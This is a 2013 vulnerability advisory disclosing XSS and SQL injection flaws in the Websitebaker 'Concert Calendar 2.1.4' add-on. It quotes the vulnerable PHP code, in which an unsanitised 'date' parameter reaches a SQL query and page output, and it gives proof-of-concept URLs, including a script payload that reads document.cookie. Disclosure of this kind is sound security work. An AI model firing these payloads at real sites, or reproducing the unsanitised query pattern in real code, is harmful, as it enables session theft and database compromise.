@@ -1,0 +1,68 @@
+Advisory:		Websitebaker Add-on 'Concert Calendar 2.1.4' XSS & SQLi vulnerability
+Advisory ID:		SSCHADV2013-001
+Author:			Stefan Schurtz
+Affected Software:	Successfully tested on Concert Calendar 2.1.4
+Vendor URL:		http://addons.websitebaker2.org/pages/en/browse-add-ons.php?id=0E8BC37
+Vendor Status:		informed
+
+==========================
+Vulnerability Description
+==========================
+
+Websitebaker Add-on 'Concert Calendar 2.1.4' is prone to a XSS and SQLi vulnerability
+
+==========================
+Vuln code
+==========================
+
+// view.php
+
+if (isset($_GET['date'])) {
+        $date = $_GET['date'];
+}
+.
+.
+.
+// SQLi
+$query_dates = mysql_query("SELECT * FROM ".TABLE_PREFIX."mod_concert_dates WHERE section_id = '$section_id' && concert_date = '$date'"); // Zeile 184
+
+// XSS
+
+echo " ".switch_date($date, $dateview)." "; // Zeile 176
+
+==========================
+PoC-Exploit
+==========================
+
+// SQLi (magic_quotes = off)
+
+http://[target]/wb/pages/addon.php?date=[SQLi]
+
+// XSS
+
+http://[target]/wb/pages/addon.php?date='"><script>alert(document.cookie)</script>
+
+==========================
+Solution
+==========================
+
+-
+
+==========================
+Disclosure Timeline
+==========================
+
+01-Jan-2013 - developer informed 
+
+==========================
+Credits
+==========================
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+==========================
+References
+==========================
+
+http://addons.websitebaker2.org/pages/en/browse-add-ons.php?id=0E8BC37
+http://www.darksecurity.de/advisories/2012/SSCHADV2012-022.txt
